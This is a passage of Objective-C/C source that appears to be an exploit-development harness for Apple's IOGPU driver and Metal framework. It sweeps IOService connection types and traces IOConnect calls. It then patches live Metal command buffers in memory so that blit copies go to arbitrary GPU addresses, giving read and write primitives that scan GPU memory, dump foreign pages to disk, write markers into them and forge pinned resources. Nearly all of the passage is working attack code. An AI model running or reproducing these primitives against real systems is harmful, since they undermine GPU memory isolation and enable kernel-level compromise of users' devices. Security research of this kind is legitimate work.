    uint32_t types[64]; int nt = 0;
    for (uint32_t t = 0; t <= 0x20; t++) types[nt++] = t;
    static const uint32_t extra[] = { 0x100, 0x1000, 0x10000, 0x100000, 0x100001,
                                      0x100002, 0x100003, 0x100004, 0x100005 };
    for (unsigned i = 0; i < sizeof(extra)/sizeof(extra[0]); i++) types[nt++] = extra[i];
    const char *sk = getenv("FUZZ_CONNPROBE_SKIP");
    int skip = sk ? atoi(sk) : 0;
    int idx = 0;
    for (unsigned si = 0; si < sizeof(sweepSvcs)/sizeof(sweepSvcs[0]); si++) {
        for (int ti = 0; ti < nt; ti++) {
            idx++;
            if (idx <= skip) continue;
            io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
                                IOServiceMatching(sweepSvcs[si]));
            if (!s) { LOG("[connp] service %s not found", sweepSvcs[si]); break; }
            io_connect_t cc = 0;
            kern_return_t ko = IOServiceOpen(s, mach_task_self(), types[ti], &cc);
            IOObjectRelease(s);
            LOG("[connp] #%d open %s type 0x%x -> kr 0x%08x conn 0x%x",
                idx, sweepSvcs[si], types[ti], ko, cc);
            if (!ko && cc) {
                char tag[80];
                snprintf(tag, sizeof tag, "%s/0x%x", sweepSvcs[si], types[ti]);
                connprobe_submittest(cc, tag);
                IOServiceClose(cc);
            }
        }
    }
    LOG("[connp] done (alive)");
}

// V88: full Metal IOConnect trace via interpose.m (in-process, main-exe
// __interpose section). Records every IOConnect* call Metal makes during a
// complete session: device -> queue -> buffers -> blit copy -> commit -> done.
extern void interpose_set_recording(int);
extern void interpose_mark(const char *);
extern void interpose_dump(void (*)(const char *));
static void mtrace_sink(const char *l) { LOG("%s", l); }

static void p_mtltrace(void) {
    LOG("[mtrace] v88: Metal IOConnect trace");
    interpose_set_recording(1);
    // self-test: does the interpose dylib hook even our own process's calls?
    interpose_mark("=== self-test begin ===");
    io_connect_t st = open_service("IOGPU", 1);
    if (st) IOServiceClose(st);
    interpose_mark("=== self-test end ===");
    interpose_mark("=== Metal session begin ===");
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    interpose_mark("device created");
    id<MTLCommandQueue> mq = [dev newCommandQueue];
    interpose_mark("queue created");
    id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    id<MTLBuffer> bufB = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    memset([bufA contents], 0x41, 0x10000);
    memset([bufB contents], 0, 0x10000);
    interpose_mark("buffers created");
    id<MTLCommandBuffer> cb = [mq commandBuffer];
    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
    [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
    [enc endEncoding];
    interpose_mark("encoded");
    [cb commit];
    interpose_mark("committed");
    [cb waitUntilCompleted];
    interpose_mark("completed");
    long c41 = 0;
    uint8_t *bb = (uint8_t *)[bufB contents];
    for (long i = 0; i < 0x10000; i++) if (bb[i] == 0x41) c41++;
    LOG("[mtrace] Metal session done, bufB 0x41 bytes %ld/0x10000", c41);
    interpose_set_recording(0);
    interpose_dump(mtrace_sink);
    LOG("[mtrace] trace dumped");
}

// find a buffer's IOGPU resource id: walk ivars (one nesting level) for a u32
// that appears in the segment list's 6-pack region. Returns rid; *host/*sub
// receive the ivar path for reuse on another buffer.
static uint32_t mtl_find_rid(id buf, const uint8_t *seg, long seglen, char *path, size_t pcap) {
    Class cls = object_getClass(buf);
    while (cls) {
        unsigned ni = 0;
        Ivar *ivs = class_copyIvarList(cls, &ni);
        for (unsigned i = 0; i < ni; i++) {
            const char *hn = ivar_getName(ivs[i]);
            uint8_t *base = (uint8_t *)(__bridge void *)buf;
            ptrdiff_t off = ivar_getOffset(ivs[i]);
            uint32_t v32 = *(uint32_t *)(base + off);
            if (v32 >= 1 && v32 < 0x10000)
                for (long o = 0x48; o + 4 <= seglen; o += 4)
                    if (*(const uint32_t *)(seg + o) == v32) {
                        snprintf(path, pcap, "direct:%s", hn ? hn : "?");
                        free(ivs);
                        return v32;
                    }
            uint64_t v = *(uint64_t *)(base + off);
            if (v > 0x100000000 && v < 0x300000000) {   // nested heap object
                uint8_t *sub = (uint8_t *)v;
                Class sc = object_getClass((__bridge id)(void *)v);
                while (sc) {
                    unsigned nj = 0;
                    Ivar *jvs = class_copyIvarList(sc, &nj);
                    for (unsigned j = 0; j < nj; j++) {
                        uint32_t w = *(uint32_t *)(sub + ivar_getOffset(jvs[j]));
                        if (w >= 1 && w < 0x10000)
                            for (long o = 0x48; o + 4 <= seglen; o += 4)
                                if (*(const uint32_t *)(seg + o) == w) {
                                    snprintf(path, pcap, "%s:%s", hn ? hn : "?", ivar_getName(jvs[j]));
                                    free(jvs); free(ivs);
                                    return w;
                                }
                    }
                    free(jvs);
                    sc = class_getSuperclass(sc);
                }
            }
        }
        free(ivs);
        cls = class_getSuperclass(cls);
    }
    return 0;
}
static uint32_t mtl_rid_bypath(id buf, const char *path) {
    char hn[128], sn[128];
    const char *colon = strchr(path, ':');
    if (!colon) return 0;
    size_t hl = (size_t)(colon - path) < 127 ? (size_t)(colon - path) : 127;
    memcpy(hn, path, hl); hn[hl] = 0;
    strlcpy(sn, colon + 1, sizeof sn);
    if (!strncmp(hn, "direct", 6)) {
        Ivar iv = class_getInstanceVariable(object_getClass(buf), sn);
        return iv ? *(uint32_t *)((uint8_t *)(__bridge void *)buf + ivar_getOffset(iv)) : 0;
    }
    Ivar hiv = class_getInstanceVariable(object_getClass(buf), hn);
    if (!hiv) return 0;
    uint8_t *sub = *(uint8_t **)((uint8_t *)(__bridge void *)buf + ivar_getOffset(hiv));
    if (!sub) return 0;
    Ivar siv = class_getInstanceVariable(object_getClass((__bridge id)(void *)sub), sn);
    return siv ? *(uint32_t *)(sub + ivar_getOffset(siv)) : 0;
}

// V89: patch a REAL Metal command buffer in-place between endEncoding and
// commit — redirect the blit copy dest GPUVA B->C inside Metal's own live
// queue/context. If C receives A's pattern, we have controlled execution of
// patched GPU commands. OOB variant (FUZZ_MTPATCH_OOB=1): dest -> unmapped
// GPUVA(A)+0x100000 to test kext residency validation (may kill the process).
static void p_mtpatch(void) {
    int oob = getenv("FUZZ_MTPATCH_OOB") != NULL;
    LOG("[mtpatch] v89: in-place Metal cmdbuf patch (oob %d)", oob);
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { LOG("[mtpatch] no device"); return; }
    id<MTLCommandQueue> mq = [dev newCommandQueue];
    id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    id<MTLBuffer> bufB = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    id<MTLBuffer> bufC = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    if (!mq || !bufA || !bufB || !bufC) { LOG("[mtpatch] alloc fail"); return; }
    memset([bufA contents], 0x41, 0x10000);
    memset([bufB contents], 0, 0x10000);
    memset([bufC contents], 0, 0x10000);
    id<MTLCommandBuffer> cb = [mq commandBuffer];
    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
    [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
    [enc endEncoding];

    void *storage = find_ivar_obj(cb, "torage", 0, "cb");
    if (!storage) { LOG("[mtpatch] no storage"); return; }
    uint64_t kva = *(uint64_t *)((uint8_t *)storage + 0x28);
    uint64_t sva = *(uint64_t *)((uint8_t *)storage + 0x68);
    uint64_t gpuA = [bufA gpuAddress];
    uint64_t gpuB = [bufB gpuAddress];
    uint64_t gpuC = [bufC gpuAddress];
    LOG("[mtpatch] gpuAddress A 0x%llx B 0x%llx C 0x%llx | kcmd %llx seg %llx",
        gpuA, gpuB, gpuC, kva, sva);
    if (!kva || !sva) return;
    uint8_t *kc = (uint8_t *)(uintptr_t)kva;
    uint8_t *sg = (uint8_t *)(uintptr_t)sva;

    // find every occurrence of the buffer GPUVAs in both shmems
    int hitsB[16], nb = 0;
    for (long o = 0; o < 0x4000 - 8; o += 4) {
        uint64_t q = *(uint64_t *)(kc + o);
        if (q == gpuA) LOG("[mtpatch] kcmd+0x%lx == gpuAddress(A)", o);
        if (q == gpuC) LOG("[mtpatch] kcmd+0x%lx == gpuAddress(C)", o);
        if (q == gpuB) { LOG("[mtpatch] kcmd+0x%lx == gpuAddress(B)  <- dest", o); if (nb < 16) hitsB[nb++] = (int)o; }
        q = *(uint64_t *)(sg + o);
        if (q == gpuA || q == gpuB || q == gpuC)
            LOG("[mtpatch] seg+0x%lx == %s", o, q == gpuA ? "gpuA" : q == gpuB ? "gpuB" : "gpuC");
    }
    LOG("[mtpatch] dest(B) hits in kcmd: %d", nb);
    mtl_hexdump("kcmd", 0, kc, 0x500);

    // patch: dest B -> C (or OOB)
    uint64_t newdest = oob ? gpuA + 0x100000 : gpuC;
    for (int i = 0; i < nb; i++)
        *(uint64_t *)(kc + hitsB[i]) = newdest;
    int patched = nb;
    if (!nb) {
        // the copy command references pool slots, not raw GPUVAs — the pool
        // table (Metal-internal resource) holds gpuAddress(B). Find every
        // qword == gpuB in our writable VM and patch it.
        mach_vm_address_t addr = 0;
        long scanned = 0;
        while (patched < 32) {
            mach_vm_size_t sz = 0;
            vm_region_basic_info_data_64_t info;
            mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
            mach_port_t obj;
            if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
                               (vm_region_info_t)&info, &cnt, &obj)) break;
            if ((info.protection & VM_PROT_WRITE) && sz >= 0x1000 && sz <= 0x4000000) {
                uint8_t *base = (uint8_t *)addr;
                for (mach_vm_size_t o = 0; o + 8 <= sz; o += 4) {
                    if (*(uint64_t *)(base + o) == gpuB) {
                        if (patched < 32) {
                            LOG("[mtpatch] pool hit %llx+0x%llx: gpuB -> 0x%llx",
                                (uint64_t)addr, (uint64_t)o, newdest);
                            *(uint64_t *)(base + o) = newdest;
                            patched++;
                        }
                    }
                }
                scanned += sz;
            }
            addr += sz;
            if (!sz) break;
        }
        LOG("[mtpatch] VM scan done (%ld MB), patched %d pool slots", scanned >> 20, patched);
    }
    // residency: replace bufB's rid with bufC's rid in the segment list groups
    {
        // parse the count-2 6-pack group with sizeKB 0x40/0x40 (the two buffers);
        // its second rid slot is bufB's rid. bufC was created right after -> ridB+1.
        uint32_t ridB = 0;
        long gsel = -1;
        for (long o = 0x48; o + 0x40 <= 0x400; o += 0x40) {
            uint16_t cnt = *(uint16_t *)(sg + o + 0x3e);
            if (cnt == 2 && *(uint32_t *)(sg + o + 0x18) == 0x40 && *(uint32_t *)(sg + o + 0x1c) == 0x40) {
                ridB = *(uint32_t *)(sg + o + 0x04);
                gsel = o;
                break;
            }
        }
        uint32_t ridC = ridB ? ridB + 1 : 0;
        LOG("[mtpatch] rids: bufB %u (group @%lx) bufC guess %u", ridB, gsel, ridC);
        if (ridB && ridC) {
            int rp = 0;
            for (long o = 0x48; o + 4 <= 0x400; o += 4)
                if (*(uint32_t *)(sg + o) == ridB) { *(uint32_t *)(sg + o) = ridC; rp++; }
            LOG("[mtpatch] residency: patched %d rid slots %u -> %u", rp, ridB, ridC);
        }
    }
    LOG("[mtpatch] patched %d slots total, dest -> 0x%llx (%s)", patched, newdest, oob ? "OOB" : "C");

    LOG("[mtpatch] committing...");
    @try {
        [cb commit];
        LOG("[mtpatch] committed, waiting...");
        [cb waitUntilCompleted];
        LOG("[mtpatch] completed");
    } @catch (NSException *ex) {
        LOG("[mtpatch] EXCEPTION: %s %s", [[ex name] UTF8String], [[ex reason] UTF8String]);
        return;
    }
    long st = (long)[cb status];
    NSError *cberr = [cb error];
    LOG("[mtpatch] cb status %ld", st);
    if (cberr) LOG("[mtpatch] cb error: %s", [[cberr description] UTF8String]);
    long b41 = 0, c41 = 0, cnz = 0;
    uint8_t *bb = (uint8_t *)[bufB contents];
    uint8_t *cc = (uint8_t *)[bufC contents];
    for (long i = 0; i < 0x10000; i++) {
        if (bb[i] == 0x41) b41++;
        if (cc[i] == 0x41) c41++;
        if (cc[i]) cnz++;
    }
    LOG("[mtpatch] readback: B 0x41 %ld (expect 0) | C 0x41 %ld nz %ld (expect 65536)",
        b41, c41, cnz);
    if (c41 > 0x8000 && b41 == 0) LOG("[mtpatch] *** MT-PATCH WRITE CONFIRMED ***");
    else if (c41) LOG("[mtpatch] partial write into C: %ld bytes", c41);
    else LOG("[mtpatch] no redirected write (B 0x41 %ld, C untouched)", b41);
    LOG("[mtpatch] done (alive)");
}

// V90: GPU VM map via patched-blit read primitive. Patch the copy SOURCE
// (pool slots holding gpuAddress(A)) to a probe GPUVA X, commit, read back B.
// Regions that once contained slots are cached so later probes scan ~MBs, not
// the whole VM. Env: FUZZ_GPUVMSCAN=1, FUZZ_SCAN_SPACE=0xN (dense single-space
// scan), FUZZ_SCAN_SKIP=N (resume after crash).
static mach_vm_address_t g_sreg[24];
static mach_vm_size_t g_sregsz[24];
static int g_nsreg = -1;   // -1 = no full scan done yet

static long gscan_patch(uint64_t from, uint64_t to) {
    long n = 0;
    if (g_nsreg < 0) {
        // full VM walk, remember regions containing hits
        g_nsreg = 0;
        mach_vm_address_t addr = 0;
        while (1) {
            mach_vm_size_t sz = 0;
            vm_region_basic_info_data_64_t info;
            mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
            mach_port_t obj;
            if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
                               (vm_region_info_t)&info, &cnt, &obj)) break;
            if ((info.protection & VM_PROT_WRITE) && sz >= 0x1000 && sz <= 0x4000000) {
                uint8_t *base = (uint8_t *)addr;
                int reg_has = 0;
                for (mach_vm_size_t o = 0; o + 8 <= sz; o += 4) {
                    if (*(uint64_t *)(base + o) == from) {
                        *(uint64_t *)(base + o) = to;
                        n++; reg_has = 1;
                    }
                }
                if (reg_has && g_nsreg < 24) {
                    g_sreg[g_nsreg] = addr;
                    g_sregsz[g_nsreg] = sz;
                    g_nsreg++;
                }
            }
            addr += sz;
            if (!sz) break;
        }
    } else {
        for (int r = 0; r < g_nsreg; r++) {
            uint8_t *base = (uint8_t *)g_sreg[r];
            for (mach_vm_size_t o = 0; o + 8 <= g_sregsz[r]; o += 4)
                if (*(uint64_t *)(base + o) == from) {
                    *(uint64_t *)(base + o) = to;
                    n++;
                }
        }
    }
    return n;
}

static void p_gpuvmscan(void) {
    LOG("[gscan] v90: GPU VM scan via patched-blit read");
    const char *sp = getenv("FUZZ_SCAN_SPACE");
    const char *sk = getenv("FUZZ_SCAN_SKIP");
    long skip = sk ? atol(sk) : 0;
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { LOG("[gscan] no device"); return; }
    id<MTLCommandQueue> mq = [dev newCommandQueue];
    id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    id<MTLBuffer> bufB = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    if (!mq || !bufA || !bufB) { LOG("[gscan] alloc fail"); return; }
    memset([bufA contents], 0x41, 0x10000);
    uint64_t gpuA = [bufA gpuAddress];
    uint64_t gpuB = [bufB gpuAddress];
    LOG("[gscan] gpuA 0x%llx gpuB 0x%llx", gpuA, gpuB);
    int v91 = getenv("FUZZ_GPUVMSCAN2") != NULL;
    NSString *dumpdir = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/gpuvm-dump"];
    if (v91) [[NSFileManager defaultManager] createDirectoryAtPath:dumpdir withIntermediateDirectories:YES attributes:nil error:nil];

    static uint64_t hits[24];
    static int nhit;
    static long pidx;
    nhit = 0; pidx = 0;

    // one read probe: X -> bufB. Returns 1 if X looked mapped-with-data.
    int (^probe)(uint64_t, const char *) = ^int(uint64_t x, const char *tag) {
        pidx++;
        if (pidx <= skip) return 0;
        id<MTLCommandBuffer> cb = [mq commandBuffer];
        id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
        [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
        [enc endEncoding];
        long np = gscan_patch(gpuA, x);
        memset([bufB contents], 0, 0x10000);
        @try {
            [cb commit];
            [cb waitUntilCompleted];
        } @catch (NSException *ex) {
            LOG("[gscan] #%ld X 0x%llx EXCEPTION %s", pidx, x, [[ex name] UTF8String]);
            return 0;
        }
        uint8_t *bb = (uint8_t *)[bufB contents];
        long nz = 0, a41 = 0;
        for (long i = 0; i < 0x10000; i++) { if (bb[i]) nz++; if (bb[i] == 0x41) a41++; }
        int data = (np > 0 && nz > 0 && a41 < 0x8000);
        LOG("[gscan] #%ld X 0x%llx (%s) -> slots %ld | B nz %ld 41 %ld %s",
            pidx, x, tag, np, nz, a41,
            np == 0 ? "NOPATCH!" : data ? "DATA-HIT" : (nz == 0 ? "unmapped/zero" : "A-passthrough?"));
        if (data) {
            mtl_hexdump("DATA", x, bb, 0x40);
            if (nhit < 24) hits[nhit++] = x;
            if (v91) {
                NSString *fn = [NSString stringWithFormat:@"%@/page_%llx.bin", dumpdir, x];
                [[NSData dataWithBytes:bb length:0x10000] writeToFile:fn atomically:NO];
            }
        }
        return data;
    };

    // 1. calibration
    probe(gpuA, "calib-self");              // expect A-passthrough (0x41)
    probe(0x1deadbeef0000ULL, "calib-unmapped");  // unmapped signature
    // 2. internal pool refs from this run's kcmd shmem
    {
        id<MTLCommandBuffer> cb0 = [mq commandBuffer];
        id<MTLBlitCommandEncoder> e0 = [cb0 blitCommandEncoder];
        [e0 copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
        [e0 endEncoding];
        void *st0 = find_ivar_obj(cb0, "torage", 0, "cb");
        uint64_t kva0 = st0 ? *(uint64_t *)((uint8_t *)st0 + 0x28) : 0;
        if (kva0) {
            uint64_t seen[16]; int ns = 0;
            for (long o = 0; o < 0x1000 - 8 && ns < 16; o += 4) {
                uint64_t q = *(uint64_t *)((uint8_t *)(uintptr_t)kva0 + o);
                if ((q >> 32) == 0x100) {
                    int dup = 0;
                    for (int k = 0; k < ns; k++) if ((seen[k] & ~0xffffULL) == (q & ~0xffffULL)) dup = 1;
                    if (!dup) seen[ns++] = q;
                }
            }
            for (int k = 0; k < ns; k++) probe(seen[k], "kcmd-internal");
        }
        // this cb is never committed; fine (encode only)
    }
    if (v91 && !getenv("FUZZ_SCAN_WRITEONLY")) {
        // phase A: page dumps of the service regions
        for (uint64_t x = 0x10000c000ULL; x < 0x100044000ULL; x += 0x4000)
            probe(x, "A-dump");
        for (uint64_t x = 0x1000000000ULL; x < 0x100000c000ULL; x += 0x4000)
            probe(x, "A-dump-0x10");
        // phase B: extended scan
        for (uint64_t x = 0x100044000ULL; x < 0x100100000ULL; x += 0x4000)
            probe(x, "B-ext");
    } else if (sp) {
        // dense single-space scan: 0x400000 bytes, 0x4000 step
        uint64_t base = strtoull(sp, NULL, 0) << 32;
        for (uint64_t off = 0; off < 0x400000; off += 0x4000)
            probe(base + off, "space-dense");
    } else if (getenv("FUZZ_SCAN_WRITEONLY")) {
        // skip read phases entirely — write matrix only
    } else {
        // 3. low 0x1-space
        for (uint64_t a = 0x10000000000ULL; a < 0x10000100000ULL; a += 0x4000)
            probe(a, "low-0x1");
        // 4. around our buffers
        for (uint64_t a = (gpuA & ~0x3fffULL) - 0x40000; a < gpuB + 0x80000; a += 0x8000)
            probe(a, "near-bufs");
        // 5. space 0x0
        for (uint64_t a = 0; a < 0x400000; a += 0x40000)
            probe(a, "space-0x0");
        // 6. high spaces, a few probes each
        static const uint64_t spaces[] = { 0x2, 0x4, 0x8, 0x10, 0x40, 0x100 };
        for (unsigned s = 0; s < sizeof(spaces)/sizeof(spaces[0]); s++)
            for (uint64_t off = 0; off <= 0x8000; off += 0x4000)
                probe((spaces[s] << 32) + off, "space-high");
    }
    LOG("[gscan] scan done: %ld probes, %d data hits", pidx - skip, nhit);

    // 7. write-probes on the most interesting hits: marker -> X, then read X back
    // write-probe targets: collected hits + (v91) hardcoded known-mapped pages
    static const uint64_t wt_static[] = {
        0x10000c000ULL, 0x100010000ULL, 0x10001c000ULL, 0x100020000ULL,
        0x100034000ULL, 0x100040000ULL, 0x100110000ULL, 0x100120000ULL,
        0x1000000000ULL, 0x1000004000ULL,
    };
    uint64_t wt[40]; int nwt = 0;
    int wcap = v91 ? 24 : 8;
    for (int i = 0; i < nhit && i < wcap; i++) wt[nwt++] = hits[i];
    if (v91) for (unsigned i = 0; i < sizeof(wt_static)/sizeof(wt_static[0]); i++) wt[nwt++] = wt_static[i];
    uint64_t wskip = sk ? strtoull(sk, NULL, 0) : 0;
    for (int h = 0; h < nwt; h++) {
        uint64_t x = wt[h];
        if (v91 && wskip > 0xffff && x < wskip) continue;   // hex addr resume
        uint64_t marker = 0xdeadbeef00000000ULL | (x & 0xffffffffULL);
        uint64_t *ap = (uint64_t *)[bufA contents];
        for (int i = 0; i < 0x10000 / 8; i++) ap[i] = marker;
        id<MTLCommandBuffer> cb = [mq commandBuffer];
        id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
        [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
        [enc endEncoding];
        long np = gscan_patch(gpuB, x);   // dest slots -> X
        @try {
            [cb commit];
            [cb waitUntilCompleted];
        } @catch (NSException *ex) {
            LOG("[gscan] write-probe X 0x%llx EXCEPTION %s", x, [[ex name] UTF8String]);
            continue;
        }
        LOG("[gscan] write-probe X 0x%llx: dest slots patched %ld, committed", x, np);
        // read back X into bufB
        memset([bufA contents], 0x41, 0x10000);
        id<MTLCommandBuffer> cb2 = [mq commandBuffer];
        id<MTLBlitCommandEncoder> enc2 = [cb2 blitCommandEncoder];
        [enc2 copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
        [enc2 endEncoding];
        gscan_patch(gpuA, x);
        memset([bufB contents], 0, 0x10000);
        @try {
            [cb2 commit];
            [cb2 waitUntilCompleted];
        } @catch (NSException *ex) {
            LOG("[gscan] write-probe readback X 0x%llx EXCEPTION", x);
            continue;
        }
        uint64_t *bp = (uint64_t *)[bufB contents];
        int nmark = 0;
        for (int i = 0; i < 0x10000 / 8; i++) if (bp[i] == marker) nmark++;
        LOG("[gscan] write-probe X 0x%llx -> %s (marker qwords %d/8192)",
            x, nmark > 4000 ? "WROTE ***" : "DROPPED", nmark);
    }
    LOG("[gscan] done (alive)");
}

// V91: page-granular dumps of the service GPU pages, write matrix, extended
// scan. Copy size 0x4000 (one page per probe). Pages saved to
// Documents/gpuvm-dump/page_<gpuva>.bin. Ops are numbered; FUZZ_SCAN_SKIP
// resumes after a fatal probe.
static uint64_t g_srcx, g_dstx;   // gpuA/gpuB xor-masked (the slot patcher
                                  // rewrites any in-VM copy of the raw value)
static long gscan2_one(id<MTLCommandQueue> mq, id<MTLBuffer> bufA, id<MTLBuffer> bufB,
                       uint64_t x, int wr) {
    uint64_t gpuA = g_srcx ^ 0x5a5a5a5a5a5a5a5aULL;
    uint64_t gpuB = g_dstx ^ 0x5a5a5a5a5a5a5a5aULL;
    id<MTLCommandBuffer> cb = [mq commandBuffer];
    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
    [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
    [enc endEncoding];
    long np = gscan_patch(wr ? gpuB : gpuA, x);
    if (!wr) memset([bufB contents], 0, 0x10000);
    @try {
        [cb commit];
        [cb waitUntilCompleted];
    } @catch (NSException *ex) {
        return -1;
    }
    return np;
}

static void p_gpuvmscan2(void) {
    LOG("[gscan2] v91: page dumps + write matrix + extended scan");
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) return;
    id<MTLCommandQueue> mq = [dev newCommandQueue];
    id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    id<MTLBuffer> bufB = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
    if (!mq || !bufA || !bufB) return;
    memset([bufA contents], 0x41, 0x10000);
    memset([bufB contents], 0, 0x10000);
    uint64_t gpuA = [bufA gpuAddress];
    uint64_t gpuB = [bufB gpuAddress];
    g_srcx = gpuA ^ 0x5a5a5a5a5a5a5a5aULL;
    g_dstx = gpuB ^ 0x5a5a5a5a5a5a5a5aULL;
    NSString *dir = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/gpuvm-dump"];
    [[NSFileManager defaultManager] createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:nil];
    const char *sk = getenv("FUZZ_SCAN_SKIP");
    long skip = sk ? atol(sk) : 0;
    long op = 0;
    uint8_t *bb = (uint8_t *)[bufB contents];
    static uint64_t mapped[128];
    int nmapped = 0;
    // op #1: calib self-probe (from==to==gpuA) — builds the slot-region cache
    // WITHOUT corrupting Metal's bookkeeping (v91 lesson: a full-scan patch to a
    // foreign address rewrites bufA's stored gpuAddress and blinds later probes).
    {
        op++;
        if (op > skip) {
            long np = gscan2_one(mq, bufA, bufB, gpuA, 0);
            long a41 = 0;
            for (long i = 0; i < 0x10000; i++) if (bb[i] == 0x41) a41++;
            LOG("[gscan2] calib-self: slots %ld B 0x41 %ld/0x10000 %s", op, np, a41,
                a41 > 0x8000 ? "OK" : "BROKEN");
        }
    }

    // ---- phase A: page dumps 0x1_0000c000..0x1_00044000, 0x10_00000000..0x10_0000c000
    static const struct { uint64_t base, end; } dumpRanges[] = {
        { 0x10000c000ULL, 0x100044000ULL },
        { 0x1000000000ULL, 0x100000c000ULL },
    };
    for (unsigned ri = 0; ri < sizeof(dumpRanges)/sizeof(dumpRanges[0]); ri++) {
        for (uint64_t x = dumpRanges[ri].base; x < dumpRanges[ri].end; x += 0x4000) {
            op++;
            if (op <= skip) continue;
            long np = gscan2_one(mq, bufA, bufB, x, 0);
            long nz = 0;
            for (long i = 0; i < 0x10000; i++) if (bb[i]) nz++;
            LOG("[gscan2] A#%ld page 0x%llx -> slots %ld nz %ld %s", op, x, np, nz, nz ? "MAPPED" : "");
            if (np > 0 && nz > 0) {
                NSString *fn = [NSString stringWithFormat:@"%@/page_%llx.bin", dir, x];
                NSData *d = [NSData dataWithBytes:bb length:0x10000];
                [d writeToFile:fn atomically:NO];
                if (nmapped < 128) mapped[nmapped++] = x;
            }
        }
    }
    // ---- phase B: extended read scan 0x1_00044000..0x1_00100000
    for (uint64_t x = 0x100044000ULL; x < 0x100100000ULL; x += 0x4000) {
        op++;
        if (op <= skip) continue;
        long np = gscan2_one(mq, bufA, bufB, x, 0);
        long nz = 0;
        for (long i = 0; i < 0x10000; i++) if (bb[i]) nz++;
        if (np > 0 && nz > 0) {
            LOG("[gscan2] B#%ld page 0x%llx -> nz %ld MAPPED", op, x, nz);
            mtl_hexdump("B-DATA", x, bb, 0x40);
            NSString *fn = [NSString stringWithFormat:@"%@/page_%llx.bin", dir, x];
            [[NSData dataWithBytes:bb length:0x10000] writeToFile:fn atomically:NO];
            if (nmapped < 128) mapped[nmapped++] = x;
        } else if ((op & 0x1f) == 0) {
            LOG("[gscan2] B#%ld alive (x 0x%llx)", op, x);
        }
    }
    LOG("[gscan2] read phases done: %ld ops, %d mapped pages", op, nmapped);

    // ---- phase C: write matrix over mapped pages
    for (int h = 0; h < nmapped; h++) {
        uint64_t x = mapped[h];
        op++;
        if (op <= skip) continue;
        uint64_t marker = 0xdeadbeef00000000ULL | (x & 0xffffffffULL);
        uint64_t *ap = (uint64_t *)[bufA contents];
        for (int i = 0; i < 0x10000 / 8; i++) ap[i] = marker;
        LOG("[gscan2] C#%ld write-probe 0x%llx...", op, x);
        long np = gscan2_one(mq, bufA, bufB, x, 1);
        if (np < 0) { LOG("[gscan2] C#%ld 0x%llx commit exception", op, x); continue; }
        // read back
        long np2 = gscan2_one(mq, bufA, bufB, x, 0);
        (void)np2;
        long nm = 0;
        uint64_t *bp = (uint64_t *)bb;
        for (int i = 0; i < 0x10000 / 8; i++) if (bp[i] == marker) nm++;
        LOG("[gscan2] C#%ld page 0x%llx -> %s (marker qwords %ld/2048, slots %ld)",
            op, x, nm > 4096 ? "WROTE" : "DROPPED", nm, np);
        memset(ap, 0x41, 0x10000);   // restore A for further reads
    }
    LOG("[gscan2] done (alive), total ops %ld", op);
}

// V92: pinned-GPUAddress resources (new_resource format B with pinned fields).
// variant 0 = task spec: +0x30 u64 pinned addr, +0x38 u64 size (base fields as
// in the traced plain alloc); variant 1 = the pinned record from the macOS
// trace: +0x08 u64 = addr, +0x14 = 0xc430, +0x30 = 0, +0x48 = size,
// +0x58 = 0x38000000.
static uint32_t pinned_resource(io_connect_t c, uint64_t addr, uint64_t size,
                                uint64_t *gpuva_out, uint8_t **cpu_out, int variant) {
    uint8_t *in = must_map(0x1000);
    uint8_t *out = must_map(0x1000);
    memset(in, 0, 0x1000); memset(out, 0, 0x1000);
    *(uint32_t *)(in + 0x00) = 0x00;
    if (variant == 0) {
        *(uint32_t *)(in + 0x08) = 0x00010001;
        *(uint32_t *)(in + 0x0c) = 1;
        *(uint32_t *)(in + 0x10) = 0x01000101;
        *(uint32_t *)(in + 0x14) = 0x470;
        *(uint64_t *)(in + 0x30) = addr;      // pinned GPUAddress
        *(uint64_t *)(in + 0x38) = size;
        *(uint64_t *)(in + 0x48) = size;      // sysMemSize (traced offset)
    } else {
        *(uint64_t *)(in + 0x08) = addr;      // trace: pinned record q1
        *(uint32_t *)(in + 0x10) = 0x01000101;
        *(uint32_t *)(in + 0x14) = 0xc430;
        *(uint64_t *)(in + 0x48) = size;
        *(uint64_t *)(in + 0x58) = 0x38000000;
    }
    size_t osz = 0x58;
